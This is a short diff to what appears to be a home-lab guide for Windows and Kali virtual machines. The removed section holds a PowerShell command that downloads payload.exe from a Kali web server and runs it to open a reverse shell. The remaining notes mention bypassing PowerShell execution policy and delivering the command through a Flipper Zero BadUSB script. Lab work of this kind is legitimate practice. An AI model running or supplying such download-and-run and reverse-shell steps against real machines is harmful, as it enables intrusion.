@@ -95,25 +95,7 @@ You should be able to ping Kali VM's IP from here.
 
 ---
 
-## 6. Download Payload from Kali
-
-Assuming Kali is running a web server on port 8081:
-
-```powershell
-Invoke-WebRequest -Uri http://<kali_ip>:8081/payload.exe -OutFile payload.exe
-```
-
-Then run it:
-
-```powershell
-.\payload.exe
-```
-
-This should initiate the reverse shell back to Kali.
-
----
-
-## 7. Notes
+## 6. Notes
 
 * Make sure your Windows VM **trusts** PowerShell execution (bypass policies if needed).
 * You can use the Flipper Zero BadUSB script to execute this download+run command.
